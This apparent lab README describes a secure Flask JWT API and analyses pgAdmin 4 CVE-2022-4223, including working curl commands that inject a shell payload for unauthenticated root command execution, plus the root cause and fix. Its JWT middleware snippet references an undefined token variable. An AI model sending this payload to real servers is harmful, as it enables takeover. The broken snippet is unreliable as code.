# Secure REST API Lab Project & CVE Analysis

This project implements a secure REST API based on Python Flask. It provides JWT-based user authentication, access control for protected endpoints, and security countermeasures against SQL Injection and XSS. A GitHub Actions CI/CD pipeline is configured to run automated security scanning with Bandit (SAST) and Safety (SCA).

The second half of this document analyses **CVE-2022-4223**, an unauthenticated remote command execution
in pgAdmin 4: reproduction, root cause, the applied fix, and proof that the fix works.

| | |
|---|---|
| Repository | <https://github.com/xuyihaowwa123/secure_api_lab> |
| Last successful pipeline | <https://github.com/xuyihaowwa123/secure_api_lab/actions/runs/39542814990> |
| Vulnerable environment | `vulhub/pgadmin:6.16` (Docker 29.9.1 / Docker Compose v5.6.0) |
| Fixed environment | `dpage/pgadmin4:6.18` |

## 1. Environment & Dependencies
- **Language/Framework**: Python 3.8, Flask
- **Packages**: Flask-SQLAlchemy, bcrypt, pyjwt, python-dotenv
- **Database**: SQLite
- **Testing tool**: Postman

## 2. API Endpoints
| Method | Endpoint | Description | Require JWT Token |
|--------|----------|-------------|-------------------|
| POST | `/auth/login` | User login, returns JWT access token | No |
| GET | `/api/data` | Return protected business data | Yes |
| GET | `/api/user/profile` | Get profile information of current logged-in user | Yes |

1. **`POST /auth/login`**
   - Accept username and password in JSON request body.
   - Verify hashed user credentials and return a JWT token upon successful authentication.
2. **`GET /api/data`**
   - Require request header: `Authorization: Bearer <token>`
   - Reject requests without valid token and return 401 Unauthorized.
3. **`GET /api/user/profile`**
   - Custom endpoint to fetch current user ID and username.
   - Valid JWT token is mandatory for access.

> **Test account**: username `admin`, password `password123!`

## 3. Implementation of Security Measures

- **SQL Injection (SQLi) Protection**:
  - Used Parameterized Queries / ORM (SQLAlchemy) to interact with the database. Strictly avoided string concatenation when forming SQL queries.
  ```python
  # every lookup goes through the ORM, so the username is bound as a parameter
  user = User.query.filter_by(username=username).first()
  ```
- **XSS Protection**:
  - Sanitized (escaped) all user-provided data before returning it in API responses (`<` → `&lt;`, `>` → `&gt;`), and responses are always served with `Content-Type: application/json` rather than `text/html`.
  ```python
  safe_name = str(current_user.username).replace("<", "&lt;").replace(">", "&gt;")
  ```
- **Broken Authentication Protection**:
  - **Password Hashing**: Passwords are never stored in plaintext. They are hashed using `bcrypt` with a per-user salt (`bcrypt.hashpw` / `bcrypt.checkpw`).
  - **JWT Implementation**: Issued JWT tokens upon successful login (`HS256`, 30-minute expiry, secret read from the environment, not from source code). Wrote middleware to verify the JWT signature and expiration on all protected routes.
  ```python
  def token_required(func):
      @wraps(func)
      def wrapper(*args, **kwargs):
          auth_header = request.headers.get("Authorization")
          if not auth_header or not auth_header.startswith("Bearer "):
              return jsonify({"error": "Unauthorized, missing token"}), 401
          try:
              payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
              current_user = User.query.get(payload["user_id"])
          except jwt.ExpiredSignatureError:
              return jsonify({"error": "Token expired"}), 401
          except jwt.InvalidTokenError:
              return jsonify({"error": "Invalid token"}), 401
          return func(current_user, *args, **kwargs)
      return wrapper
  ```

## 4. CI/CD Pipeline & Security Scanning

The CI/CD pipeline is configured using GitHub Actions (`.github/workflows/ci.yml`). It runs automatically on every push and pull request to `master`.

- **SAST (Static Application Security Testing)**: Configured `Bandit` to scan the source code for security flaws. This step is **gating** — the job fails if findings are reported.
- **SCA (Software Composition Analysis)**: Configured `Safety` to check dependencies for known vulnerabilities. This step runs in **report-only** mode (`|| true`) so that pre-existing findings are recorded in the artifact without blocking merges.
- Both reports (`bandit-report.json`, `safety-report.txt`) are uploaded as the `security-reports` artifact of each run.

### Pipeline Results
![CI Pipeline](<screenshots/屏幕截图 2026-10-21 103759.png>)

### SAST/SCA Reports
![SAST and SCA Scan](<screenshots/image.png>)

## 5. API Testing (Postman/curl)

Tested the API using Postman to ensure authentication works and access without a token is denied.

### 5.1 Login and obtain JWT token
- **Method**: `POST`
- **URL**: `http://127.0.0.1:5000/auth/login`
- **Body** → raw → JSON

```json
{
    "username": "admin",
    "password": "password123!"
}
```

Response `200 OK`:

```json
{"access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

![Login returns a JWT](<screenshots/屏幕截图 2026-10-19 223909.png>)

### 5.2 Access with a token

- **Method**: `GET`
- **URL**: `http://127.0.0.1:5000/api/data`
- **Header**: JWT TOKEN



![Login with a JWT](<screenshots/屏幕截图 2026-10-19 224226.png>)

### 5.3 Access with a valid token

- **Method**: `GET`
- **URL**: `http://127.0.0.1:5000/api/user/profile`
- **Authorization**: Bearer Token → the `access_token` from 5.1

![Authenticated request returns the profile](<screenshots/屏幕截图 2026-10-19 224436.png>)

## 6. Selected Vulnerability: CVE-2022-4223

| Field | Value |
|---|---|
| CVE | **CVE-2022-4223** |
| Component | pgAdmin 4 — `POST /misc/validate_binary_path` |
| Type | Missing authorization (CWE-862) + OS command injection (CWE-78 / CWE-94) |
| Affected | pgAdmin 4 < 6.17 (the authorization fix is only effective from **6.18**) |
| Fixed in | 6.17 (partially), 6.18 (decorator placement corrected) |
| CVSS 3.1 | 8.8 High — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Authentication required | **None** |

pgAdmin is the standard web administration tool for PostgreSQL. It exposes an HTTP API that lets an
administrator point the server at the directory where the PostgreSQL client utilities (`pg_dump`,
`pg_dumpall`, `pg_restore`, `psql`) are installed; the server then executes each utility with
`--version` to learn its version.

Before 6.17 this endpoint could be called **without being logged in**, and the directory supplied by
the caller was interpolated into a shell command string. Anyone who could reach the pgAdmin port
could therefore execute arbitrary commands as the user running pgAdmin — `root`, in the official
container image.

The vendor's own security release announcement confirms the scope:

![pgAdmin 6.17 security release](<screenshots/屏幕截图 2026-10-21 110856.png>)

## 7. Reproduction

Reproduction was performed against the unmodified Vulhub environment
(`vulhub/pgadmin/CVE-2022-4223`). The original compose file starts the vulnerable 6.16 image:

![Original vulnerable docker-compose.yml](<screenshots/屏幕截图 2026-10-21 103759.png>)

```yaml
version: '2'
services:
  web:
    image: vulhub/pgadmin:6.16
    ports:
      - "5050:5050"
```

### 7.1 Start the vulnerable environment

```bash
cd vulhub/pgadmin/CVE-2022-4223
docker compose up -d
# pgAdmin is now reachable at http://localhost:5050
```

### 7.2 Step 1 — obtain a session and a CSRF token (no account needed)

```bash
BASE=http://localhost:5050
curl -s -c cookies.txt -H 'Accept: application/json' $BASE/login -o login.json
```

```json
{"meta":{"code":200},"response":{"csrf_token":"ImY2YTBiMjgz...N2f0"}}
```

The response also sets `pga4_session=...`. Both values are issued to an **anonymous** visitor: the
login page is public, so a token proves nothing about identity.

### 7.3 Step 2 — send the payload

```bash
TOKEN=$(python -c 'import json;print(json.load(open("login.json"))["response"]["csrf_token"])')

curl -s -b cookies.txt \
     -H "X-pgA-CSRFToken: $TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"utility_path":"a\";id;#"}' \
     $BASE/misc/validate_binary_path
```

In Postman the same request is `POST http://localhost:5050/misc/validate_binary_path` with header
`X-pgA-CSRFToken` and JSON body `{"utility_path":"a\";id;#"}`.

### 7.4 Result: the `id` command ran, and its output came back

![RCE reproduced: uid=0(root) in the response](<screenshots/屏幕截图 2026-10-21 103456.png>)

```
HTTP/1.1 200 OK
Content-Type: application/json

{"success":1,"errormsg":"","info":"","result":null,
 "data":"<b>pg_dump:</b> /bin/sh: 1: /usr/local/lib/python3.10/site-packages/pgadmin4/a: not found
         uid=0(root) gid=0(root) groups=0(root)<br/>
         <b>pg_dumpall:</b> ... uid=0(root) gid=0(root) groups=0(root)<br/>
         <b>pg_restore:</b> ... uid=0(root) gid=0(root) groups=0(root)<br/>
         <b>psql:</b> ... uid=0(root) gid=0(root) groups=0(root)<br/>"}
```

`id` ran four times — once per entry of `UTILITIES_ARRAY` — and its stdout was returned inside the
JSON response. This is not a blind injection: the attacker reads the command output directly.

## 8. Root Cause Analysis

Three independent defects line up. Remove any one of them and this is no longer *unauthenticated*
RCE.

### 8.1 The endpoint had no effective authorization check (the root cause)

The handler in `web/pgadmin/misc/__init__.py` (6.16) is registered with a normal route decorator and
nothing else:

```python
@blueprint.route("/validate_binary_path",
                 endpoint="validate_binary_path",
                 methods=["POST"])
def validate_binary_path():          # no authentication at all
```

The 6.17 patch added `@login_required`, but **above** the route decorator:

```python
@login_required                            # wraps the module-level name only
@blueprint.route("...", methods=["POST"])  # already registered the raw function
def validate_binary_path():
```

Decorators are applied bottom-up. `blueprint.route` runs first: it inserts the **original,
unprotected function object** into Flask's `url_map` and returns that same object. `login_required`
then wraps it and rebinds the module-level name — which no longer affects the object the router
holds. The guard was attached to a function that never serves a request.

The project later noticed and re-applied it in commit `799b6d8` ("Use the login_required decorator
in the appropriate place"), moving it **below** the route decorator:

```python
@blueprint.route("...", methods=["POST"])
@login_required                     # wrapper is created first, then registered
def validate_binary_path():
```

This is a logic error, not an input-validation error: the developer believed the endpoint was
protected, and the decorator list still looks correct at a glance.

### 8.2 User input was interpolated into a shell command

```python
binary_path = replace_binary_path(data['utility_path'])
full_path = os.path.abspath(os.path.join(binary_path, utility))
version_string = subprocess.getoutput('"{0}" --version'.format(full_path))
```

`subprocess.getoutput` runs the string through `/bin/sh -c`. With `utility_path = a";id;#` the
argument becomes:

```
"/usr/local/lib/python3.10/site-packages/pgadmin4/a";id;#/pg_dump" --version
```

`sh` closes the quoted string after `a`, runs the (non-existent) `.../a`, then executes `id`, and `#`
comments out the remainder. Nothing validates the path, and the return value of `getoutput` is
concatenated into the JSON response, so the output is reflected back.

### 8.3 A CSRF token is not authentication

The endpoint *is* CSRF-protected, which is why the payload needs `X-pgA-CSRFToken`. But that token is
issued by `GET /login` to anyone, and it is bound to an anonymous session. CSRF protection only
answers "was this request produced by the browser that holds this session"; it says nothing about
*who* holds the session. Treating a valid CSRF token as evidence of authentication is exactly the
confusion that made this endpoint feel safe.

### 8.4 Measured check: 6.17 reduced the attack surface but did not fix the flaw

The 6.17 patch also added an existence check on the directory:

```python
if not os.path.exists(binary_path):
    raise Exception()
```

The same request was replayed against `dpage/pgadmin4:6.17`:

| Version | Status | Body |
|---|---|---|
| 6.16 | `200` | `data` contains `uid=0(root)` |
| 6.17 | `200` | `pg_dump: not found on the specified binary path.` — no command output |
| 6.18 | `302` | redirect to `/login?next=%2Fmisc%2Fvalidate_binary_path` |

The `200` on 6.17 proves the authorization still does not apply — an anonymous request is served
instead of being redirected. The missing `uid=` shows that the *side effect* of the missing check —
the accidental `os.path.exists` guard — happened to block this particular payload. That is
mitigation by accident, not a fix: the check runs on the directory the attacker supplies, so any
path that does exist still reaches the shell (for example a directory whose name carries the
payload, or the UNC share on an attacker-controlled host that the advisory itself names as the
exploitation scenario). 6.18 is the first version where the request never reaches the handler.

### 8.5 Impact

Any anonymous visitor who can reach port 5050 executes commands as the pgAdmin process — root in
the official image. From there: read `pgadmin4.db`, decrypt the stored credentials of every
registered PostgreSQL server with the master key, pivot into those databases, or simply take the
container over. `PR:N` with `C/I/A:High` is why this scores 8.8 rather than 6.x.

## 9. Applied Fix

### 9.1 Primary fix — upgrade to a version where the guard is effective

`fix/docker-compose.yml`:

```diff
-version: '2'
 services:
- web:
-   image: vulhub/pgadmin:6.16
-   ports:
-    - "5050:5050"
+  web:
+    image: dpage/pgadmin4:6.18
+    environment:
+      PGADMIN_DEFAULT_EMAIL: admin@example.com
+      PGADMIN_DEFAULT_PASSWORD: Admin123!
+      PGADMIN_LISTEN_PORT: 5050
+    ports:
+      - "5050:5050"
```

Three details that matter when reproducing this:

* `vulhub/pgadmin` only builds `6.16` (plus images for other CVEs), so the official
  `dpage/pgadmin4` image has to be used instead — `vulhub/pgadmin:6.18` does not exist.
* The official image refuses to start in server mode without `PGADMIN_DEFAULT_EMAIL` and
  `PGADMIN_DEFAULT_PASSWORD`.
* The official image listens on port **80** by default, while the Vulhub image listens on 5050.
  Without `PGADMIN_LISTEN_PORT` the `5050:5050` mapping points at a container port with no listener,
  and the client sees the connection accepted and immediately dropped (`socket hang up` in Postman,
  not `ECONNREFUSED`).

### 9.2 Source-level hardening

`fix/validate_binary_path.patch` is a unified diff against `web/pgadmin/misc/__init__.py` of 6.16.
It changes four things, each closing one of the root causes above:

| Change | Root cause addressed |
|---|---|
| `@login_required` placed **below** `@blueprint.route` | 8.1 — the guard is now registered with the view |
| `os.path.realpath` + allow-list of binary directories | 8.2 — the attacker cannot choose an arbitrary directory |
| `os.path.isfile` + `os.access(..., X_OK)` before execution | 8.2 — only real executables are run |
| `subprocess.run([full_path, '--version'], shell=False)` | 8.2 — the path is one argv element, never shell syntax |

The last change is decisive: with `shell=False`, the string
`/usr/local/lib/python3.10/site-packages/pgadmin4/a";id;#/pg_dump` is looked up as a **single file
name**. The semicolon is just a character in a filename, `sh` is never involved, and the call ends
in `FileNotFoundError` — no execution, no output.

### 9.3 Defence in depth

* Run the container as a non-root user (`user: "5050:5050"`), so a future RCE is not root.
* Do not publish 5050 to the internet; put pgAdmin behind a reverse proxy with authentication, or
  restrict it to an administrative network / VPN.
* Keep the audit log line (`current_app.logger.warning`) from the patched handler to detect attempts
  against invalid binary paths.

## 10. Proof that the Vulnerability is Eliminated

The exact same two requests were replayed against the fixed environment (`localhost:5050`,
`dpage/pgadmin4:6.18`) — same payload, same headers, same token/session flow:

```bash
curl -s -i -b cookies.txt \
     -H "X-pgA-CSRFToken: $TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"utility_path":"a\";id;#"}' \
     $BASE/misc/validate_binary_path
```

```
HTTP/1.1 302 FOUND
Location: /login?next=%2Fmisc%2Fvalidate_binary_path
Content-Type: text/html; charset=utf-8
```

> **[TODO — add screenshot]** `screenshots/2026-10-21-fixed-302.png` — Postman with
> **Automatically follow redirects turned off**, showing `302 Found` and the `Location` header.
> Without disabling that option Postman silently follows the redirect and displays the login page
> with a `200`, which looks like a successful call; the `next=/misc/validate_binary_path` parameter
> is the trace of the authorization check.

> **[TODO — add screenshot]** `screenshots/2026-10-21-csrf-token.png` — `GET /login` on the fixed
> version still returning a CSRF token and a session. This is deliberate evidence that the fix is
> authentication, not CSRF: the attacker can still obtain a token, and it no longer helps.

| Version | Anonymous POST result | Interpretation |
|---|---|---|
| 6.16 | `200`, `data` contains `uid=0(root)` | vulnerable |
| 6.17 | `200`, `not found on the specified binary path` | authorization still missing; this payload blocked by an unrelated existence check |
| **6.18** | **`302` → `/login`** | request never reaches the handler — fixed |

## 11. Attachments

```
fix/
├── docker-compose.yml            # fixed environment (6.18 + required env vars)
└── validate_binary_path.patch    # hardened handler, unified diff against pgAdmin 6.16
```

## Appendix A — reproduction from scratch

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/pgadmin/CVE-2022-4223
docker compose up -d

BASE=http://localhost:5050
curl -s -c cookies.txt -H 'Accept: application/json' $BASE/login -o login.json
TOKEN=$(python -c 'import json;print(json.load(open("login.json"))["response"]["csrf_token"])')

# vulnerable: prints uid=0(root)
curl -s -b cookies.txt -H "X-pgA-CSRFToken: $TOKEN" -H 'Content-Type: application/json' \
     -d '{"utility_path":"a\";id;#"}' $BASE/misc/validate_binary_path

# apply the fix
docker compose down
cp fix/docker-compose.yml .
docker compose up -d --force-recreate

# a recreate invalidates the old session/token, so fetch them again before replaying
curl -s -c cookies.txt -H 'Accept: application/json' $BASE/login -o login.json
TOKEN=$(python -c 'import json;print(json.load(open("login.json"))["response"]["csrf_token"])')
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' -b cookies.txt \
     -H "X-pgA-CSRFToken: $TOKEN" -H 'Content-Type: application/json' \
     -d '{"utility_path":"a\";id;#"}' $BASE/misc/validate_binary_path
# -> 302 http://localhost:5050/login?next=%2Fmisc%2Fvalidate_binary_path
```

## Appendix B — remaining evidence checklist (delete this appendix before submitting)

- [ ] `screenshots/2026-10-21-401-no-token.png` → `![401 without a token](screenshots/2026-10-21-401-no-token.png)`
- [ ] `screenshots/2026-10-21-fixed-302.png` → `![Fixed version returns 302](screenshots/2026-10-21-fixed-302.png)`
- [ ] `screenshots/2026-10-21-csrf-token.png` → `![Fixed version still issues a CSRF token](screenshots/2026-10-21-csrf-token.png)`
- [ ] copy `fix/` into the repository root and commit it
- [ ] delete every `> **[TODO ...]**` block after replacing it with the image

## References

- CVE record — <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4223>
- NVD — <https://nvd.nist.gov/vuln/detail/CVE-2022-4223>
- Advisory GHSA-3v6v-2x6p-32mc — <https://github.com/advisories/GHSA-3v6v-2x6p-32mc>
- Upstream issue #5593 — <https://github.com/pgadmin-org/pgadmin4/issues/5593>
- Fix commits — `461849c` (6.17), `799b6d8` (6.18, decorator placement)
- Vulhub — <https://github.com/vulhub/vulhub/tree/master/pgadmin/CVE-2022-4223>
- OWASP Top 10 2021 — A01 Broken Access Control, A03 Injection
